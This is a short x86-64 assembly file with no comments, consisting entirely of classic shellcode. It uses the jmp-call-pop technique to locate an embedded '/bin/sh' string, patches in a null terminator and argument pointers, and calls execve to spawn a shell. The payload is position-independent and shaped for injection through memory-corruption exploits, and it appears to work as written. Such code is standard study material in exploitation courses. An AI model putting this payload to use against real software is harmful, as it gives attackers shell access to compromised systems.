segment .data

segment .text
	global _start

_start:
	jmp short two
one:
	xor rax, rax
	pop rbx

	mov [rbx+7], al
	mov [rbx+8], rbx
	mov [rbx+16], rax

	mov al, 59
	lea rdi, [rbx]
	lea rsi, [rbx+8]
	lea rdx, [rbx+16]

	syscall
two:
	call one
	db "/bin/sh0aaaaaaaabbbbbbbb"


